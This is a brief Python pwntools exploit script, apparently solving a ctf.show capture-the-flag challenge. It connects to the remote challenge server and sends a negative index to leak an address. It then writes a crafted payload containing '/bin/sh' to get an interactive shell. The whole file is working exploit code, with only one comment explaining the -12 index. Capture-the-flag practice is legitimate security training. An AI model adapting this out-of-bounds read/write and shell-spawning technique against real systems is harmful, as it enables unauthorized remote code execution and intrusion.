from pwn import *

io = remote('pwn.challenge.ctf.show', 28238)
# 0xffffffff-11就是-12
io.send(p32(0xffffffff-11)+p32(8))
r = io.recv(8)
vt = u64(r)
vt2 = vt-0x10
pay = p64(vt2)+p32(4660)+"/bin/sh\x00".encode()
size = len(pay)
io.send(p32(0xffffffff-11)+p32(size)+pay)
io.interactive()